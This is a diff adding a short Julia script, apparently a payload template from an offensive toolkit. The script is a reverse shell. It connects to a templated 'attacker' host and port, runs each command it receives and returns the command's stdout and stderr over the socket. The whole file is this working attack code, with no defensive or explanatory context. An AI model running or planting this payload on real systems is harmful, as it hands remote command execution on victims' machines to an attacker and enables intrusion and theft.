@@ -1,0 +1,23 @@
+using Sockets
+
+# Open a new socket and connect to the attacker
+sock = connect("^\host^", parse(Int64, "^\port^"))
+
+while true
+    cmd = readline(sock)
+
+    # Only run non-empty commands (they would cause an error)
+    if !isempty(cmd)
+        cmd = split(cmd)
+
+        # Prepare buffers for capturing stdout and stderr
+        ioo = IOBuffer()
+        ioe = IOBuffer()
+
+        # Execute the command with redirected output
+        run(pipeline(`$cmd`, stdout=ioo, stderr=ioe))
+
+        # Send back the output
+        write(sock, String(take!(ioo)) * String(take!(ioe)))
+    end
+end
